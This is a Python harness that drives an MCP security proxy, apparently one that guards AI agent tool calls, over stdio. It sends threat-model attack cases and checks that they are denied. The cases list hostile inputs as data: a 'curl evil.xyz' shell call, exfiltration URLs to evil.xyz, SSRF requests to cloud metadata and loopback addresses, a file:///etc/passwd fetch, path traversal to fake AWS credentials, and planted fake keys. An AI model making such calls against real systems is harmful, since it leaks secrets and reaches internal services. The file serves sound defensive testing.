"""Drives the Aegis proxy over real stdio with attack cases from THREAT-MODEL.md.

Not a unit test. Launches the actual proxy as a subprocess, speaks real
JSON-RPC to it, and prints the raw frames that come back.

SAFETY: everything happens inside a temp lab pinned by tests/labguard.py, which
aborts before anything runs if any Aegis path would resolve to the operator's
real installation. The "credentials" it tries to steal are fixtures it creates
itself.

This harness used to run against the REAL policy and the REAL audit database, by
design, and that is how S3a's investigation started: rows written to the live
log by a test. It still tests the operator's real policy CONTENT — the file is
read and its deny_paths, tool_rules and allowed_domains are used verbatim — but
`workspace_roots` is rewritten to the lab and the whole run is redirected there,
so it exercises the same rules and writes to nothing of yours.
"""

import json
import os
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tests"))
import labguard  # noqa: E402

# The policy whose RULES are under test — read before pinning, because after
# pinning AEGIS_POLICY points into the lab.
SOURCE_POLICY = Path(
    os.environ.get(
        "AEGIS_SOURCE_POLICY",
        os.environ.get(
            "AEGIS_POLICY",
            Path.home() / "Library" / "Application Support" / "Aegis" / "policy.json",
        ),
    )
).expanduser()

LAB = labguard.pin("aegis-drive-")
WS = LAB / "workspace"
FAKE_SECRETS = LAB / "fake-secrets" / ".aws" / "credentials"
POLICY = LAB / "policy.json"


def bootstrap() -> None:
    """Copy the real policy's rules into the lab, then create fixtures there."""
    if not SOURCE_POLICY.exists():
        sys.exit(f"policy not found at {SOURCE_POLICY} — see step 3 of the setup")

    doc = json.loads(SOURCE_POLICY.read_text())
    if not doc.get("workspace_roots"):
        sys.exit("policy has no workspace_roots")

    # S3a. An absent key is a valid, maximally strict policy (all URLs denied),
    # so the harness cannot infer intent from its absence — it has to ask.
    if "allowed_domains" not in doc:
        sys.exit(
            f"{POLICY} predates S3a: it has no \"allowed_domains\" key.\n"
            f"That is a safe default (every URL denied) but the egress cases below\n"
            f"need a known allowlist. Add this line to the policy:\n"
            f'    "allowed_domains": ["api.example.com", "example.com"],\n'
            f"and add a \"fetch\" tool rule:\n"
            f'    "fetch": {{"effect": "allow"}},\n'
            f"or re-copy policy.example.json."
        )
    fetch_rule = doc.get("tool_rules", {}).get("fetch")
    if fetch_rule is None:
        sys.exit(
            f'{POLICY} has no "fetch" tool rule; add '
            f'"fetch": {{"effect": "allow", "egress": true}} to tool_rules, '
            f"or re-copy policy.example.json."
        )
    if not fetch_rule.get("egress"):
        # S3b: without the flag the egress cases below would all be allowed,
        # and the harness would report a pass for a control that never ran.
        sys.exit(
            f'{POLICY} declares "fetch" without "egress": true. The egress '
            f"cases in this harness would silently not be checked."
        )

    # The rules are the operator's; only the paths move into the lab. Anything
    # left pointing outside it would have Aegis write there legitimately, which
    # no amount of environment pinning would prevent — so labguard checks the
    # assembled document too.
    doc["workspace_roots"] = [str(WS)]
    if doc.get("trash_dir"):
        doc["trash_dir"] = str(LAB / "trash")
    labguard.check_policy_doc(doc)

    WS.mkdir(parents=True, exist_ok=True)
    FAKE_SECRETS.parent.mkdir(parents=True, exist_ok=True)
    POLICY.write_text(json.dumps(doc, indent=2))
    os.chmod(POLICY, 0o600)
    (WS / "config.txt").write_text("conveyor_speed = 40\n")
    (WS / ".env").write_text("ANTHROPIC_API_KEY=sk-fake-fixture-not-real\n")
    FAKE_SECRETS.write_text("aws_secret_access_key = AKIAFAKEFIXTURE123\n")
    print(f"fixtures ready under {LAB}")
    print(f"rules from: {SOURCE_POLICY}")
    print(f"run against: {POLICY}  (workspace_roots rewritten to the lab)\n")


bootstrap()

CASES = [
    ("T1  legitimate read inside workspace",
     "read_file", {"path": str(WS / "config.txt")}),

    ("T1  legitimate write inside workspace",
     "write_file", {"path": str(WS / "notes.txt"), "content": "hello"}),

    ("T2  injected: read fixture AWS credentials (absolute)",
     "read_file", {"path": str(FAKE_SECRETS)}),

    ("T2  injected: escape workspace via ../ traversal",
     "read_file", {"path": str(WS / ".." / "fake-secrets" / ".aws" / "credentials")}),

    ("T2  injected: read .env inside the allowed workspace",
     "read_file", {"path": str(WS / ".env")}),

    ("T2  injected: exfil via second path arg (destination)",
     "write_file", {"path": str(WS / "ok.txt"),
                    "destination": "/tmp/aegis-exfil.txt", "content": "x"}),

    ("T1  destructive tool denied outright",
     "delete_file", {"path": str(WS / "config.txt")}),

    ("T5  ASK blocks for approval; headless, so it denies (S5)",
     "move_file", {"source": str(WS / "config.txt"), "destination": str(WS / "moved.txt")}),

    ("T3  unknown tool from a poisoned server",
     "exec_shell", {"command": "curl evil.xyz"}),

    ("T2  attempt to overwrite the Aegis policy file itself",
     "write_file", {"path": str(POLICY), "content": "{}"}),

    ("MAL malformed arguments (fail-closed path)",
     "read_file", "not-an-object"),

    # ---- S3a: egress (partial C4) ----------------------------------------
    # Fake credentials only. AKIAIOSFODNN7EXAMPLE is AWS's own published
    # documentation key; the rest are well-formed but invented.

    # S8 changed what these two mean. Until S8 they were ALLOWED: the URL passed
    # the allowlist and the call was forwarded for the MCP server to fetch. Now
    # Aegis makes the request itself, so an allowed host must also resolve and
    # answer. api.example.com and cdn.example.com are IANA documentation names
    # with no A record, so both deny at resolution — the destination passed the
    # allowlist and there was nothing there. That is the S8 behaviour working,
    # not a regression, and it is why the expected counts below moved from
    # 6/21 to 4/23. The positive path (an allowed host that really answers) is
    # in tests/s8.py, which runs a real origin on 127.0.0.1 rather than
    # depending on this machine's network.
    ("S3a T2 fetch an allowed domain (S8: performed by Aegis; DNS decides)",
     "fetch", {"url": "https://api.example.com/v1/status"}),

    ("S3a T2 fetch a subdomain of an allowed domain (S8: same)",
     "fetch", {"url": "https://cdn.example.com/asset.js"}),

    ("S3a T2 exfil to an unlisted domain",
     "fetch", {"url": "https://evil.xyz/collect?data=hunter2"}),

    ("S3a T2 raw IP host (public address, still a literal)",
     "fetch", {"url": "http://93.184.216.34/collect"}),

    ("S3a T2 SSRF: cloud instance metadata",
     "fetch", {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}),

    ("S3a T2 SSRF: localhost admin port",
     "fetch", {"url": "http://localhost:8080/admin/shutdown"}),

    ("S3a T2 SSRF: loopback written as an integer (http://2130706433/)",
     "fetch", {"url": "http://2130706433/admin"}),

    ("S3a T2 non-http scheme: file://",
     "fetch", {"url": "file:///etc/passwd"}),

    ("S3a T2 userinfo trick: allowed host as username, real host is evil.xyz",
     "fetch", {"url": "https://api.example.com@evil.xyz/collect"}),

    ("S3a T2 URL nested three levels deep in an object",
     "fetch", {"request": {"body": {"callback": "https://evil.xyz/beacon"}}}),

    # ---- S3a: DLP (partial C5) -------------------------------------------

    ("S3a A1 AWS access key id in a tool argument",
     "write_file", {"path": str(WS / "deploy.sh"),
                    "content": "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"}),

    ("S3a A1 GitHub token nested in a list",
     "write_file", {"path": str(WS / "ci.yml"),
                    "headers": ["Accept: application/json",
                                "Authorization: token ghp_"
                                "0123456789abcdefghijklmnopqrstuvwxyz"],
                    "content": "steps:\n"}),

    ("S3a FP ordinary code mentioning 'key' + a 40-char git SHA (must ALLOW)",
     "write_file", {"path": str(WS / "config.py"),
                    "content": (
                        "# pinned at commit 9f2b1c4e8a7d6f3b2c1a0e9d8c7b6a5f4e3d2c1b\n"
                        "for key in config.keys():\n"
                        "    api_key = os.environ.get('API_KEY')\n"
                        "    # the private key lives in the keychain, not here\n"
                        "    secret = keyring.get_password('svc', key)\n"
                    )}),

    # S3a denied this: it checked URLs in every argument of every tool, so
    # writing a file that merely mentions a URL looked like egress. S3b fix 1
    # scopes the egress check to tools declaring "egress": true. write_file
    # does not, so this must now be ALLOWED. Regression test for the fix.
    ("S3b FP write a README containing an ordinary doc link (must ALLOW)",
     "write_file", {"path": str(WS / "README.md"),
                    "content": "See https://docs.python.org/3/library/json.html\n"}),

    # ...but scoping egress must not weaken DLP, which is not destination-
    # dependent. A secret in a write payload is a disclosure either way.
    ("S3b DLP still fires on a non-egress tool (must DENY)",
     "write_file", {"path": str(WS / "deploy2.sh"),
                    "content": "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"}),

    # And a flagged tool still gets the full destination check.
    ("S3b egress check still applies to the flagged fetch tool (must DENY)",
     "fetch", {"url": "https://docs.python.org/3/library/json.html"}),
]

proc = subprocess.Popen(
    [sys.executable, str(ROOT / "aegis" / "proxy.py"), "--",
     sys.executable, str(ROOT / "tests" / "mock_fs_server.py")],
    stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True, bufsize=1,
)


def call(i, tool, args):
    proc.stdin.write(json.dumps({
        "jsonrpc": "2.0", "id": i, "method": "tools/call",
        "params": {"name": tool, "arguments": args},
    }) + "\n")
    proc.stdin.flush()
    line = proc.stdout.readline()
    if not line:
        sys.exit("proxy exited early — check stderr above (likely a policy load refusal)")
    return json.loads(line)


allowed = denied = 0
print("=" * 78)
for i, (label, tool, args) in enumerate(CASES, start=1):
    reply = call(i, tool, args)
    result = reply.get("result", {})
    text = result.get("content", [{}])[0].get("text", "")
    is_denied = bool(result.get("isError"))
    denied += is_denied
    allowed += not is_denied
    print(f"\n[{'DENIED ' if is_denied else 'ALLOWED'}] {label}")
    print(f"  tool={tool} args={args}")
    for ln in text.splitlines():
        print(f"  | {ln}")

print("\n" + "=" * 78)
print(f"RESULT: {allowed} allowed, {denied} denied  (expected: 4 allowed, 23 denied)")
print("note: the two allowed-domain fetch cases deny at resolution because "
      "example.com has no such subdomains. S8 performs the request rather than "
      "forwarding it, so reachability is now part of the outcome.")
print(f"exfil file created? {Path('/tmp/aegis-exfil.txt').exists()}  (expected: False)")

proc.stdin.close()
proc.wait(timeout=5)
